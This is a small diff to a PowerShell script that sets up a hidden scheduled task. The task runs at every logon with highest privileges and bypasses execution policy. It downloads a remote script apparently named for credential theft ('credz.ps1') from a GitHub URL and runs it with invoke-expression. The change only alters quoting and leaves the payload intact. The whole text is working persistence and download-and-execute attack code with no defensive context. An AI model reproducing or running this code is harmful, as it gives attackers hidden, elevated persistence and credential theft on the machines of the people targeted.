@@ -1,4 +1,4 @@
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/skekic16/lol/raw/main/credz.ps1?dl=1; invoke-expression $pl"
+$action = New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/skekic16/lol/raw/main/credz.ps1?dl=1; invoke-expression $pl'
 $trigger = New-ScheduledTaskTrigger -AtLogon
 $principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
